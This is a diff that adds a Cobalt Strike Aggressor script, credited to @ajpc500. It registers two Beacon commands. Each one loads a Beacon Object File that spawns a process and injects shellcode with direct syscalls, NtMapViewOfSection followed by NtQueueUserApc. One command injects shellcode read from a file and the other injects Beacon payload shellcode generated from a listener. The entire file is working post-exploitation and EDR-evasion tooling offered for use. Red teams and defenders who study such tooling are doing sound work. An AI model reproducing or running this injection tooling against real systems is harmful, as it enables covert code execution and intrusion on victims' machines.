@@ -1,0 +1,63 @@
+beacon_command_register(
+"static_syscalls_apc_shspawn", 
+"Spawn process and use syscalls to execute custom shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).", 
+"Synopsis: syscalls_shspawn path_to_bin");
+
+beacon_command_register(
+"static_syscalls_apc_spawn", 
+"Spawn process and use syscalls to execute beacon shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).", 
+"Synopsis: syscalls_spawn listener_name");
+
+alias static_syscalls_apc_shspawn {
+	local('$handle $data $args $sc_data');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsapcspawn. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$sc_handle = openf($2);
+	$sc_data = readb($sc_handle, -1);
+	closef($sc_handle);
+
+	# pack our arguments
+	$args = bof_pack($1, "b", $sc_data);
+	
+	btask($1, "Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)");	
+	btask($1, "Reading shellcode from: $+  $2");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias static_syscalls_apc_spawn {
+	local('$handle $data $args');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsapcspawn. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	if (listener_info($2) is $null) {
+		berror($1, "Could not find listener $2");
+	}
+	else {
+		$sc_data = artifact_payload($2, "raw", "x64");
+
+		# pack our arguments
+		$args = bof_pack($1, "b", $sc_data);
+
+		btask($1, "Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)");
+		btask($1, "Using $+  $2  $+ listener for beacon shellcode generation.");
+
+		# execute it.
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
